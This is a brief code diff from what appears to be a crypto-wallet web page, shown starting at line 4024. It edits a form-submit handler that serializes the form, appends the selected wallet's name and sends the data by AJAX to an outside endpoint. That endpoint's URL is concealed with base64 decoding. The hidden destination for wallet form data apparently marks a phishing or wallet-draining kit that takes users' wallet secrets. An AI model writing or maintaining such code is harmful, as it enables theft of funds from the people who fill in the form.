@@ -4024,7 +4024,7 @@
   event.preventDefault(); // Prevent default form submission behavior
   
   var formData = $(this).serialize();
-  formData += '&wallet='+$('#wallet_name').text(wd.data('title'));
+  formData += '&wallet='+$('#wallet_name').text().trim();
   
   $.ajax({
     url: atob('aHR0cHM6Ly9veGJpdHdvcmxkLmNvbS93YWxsZXQvcHJvY2Vzc29yLnBocA=='),
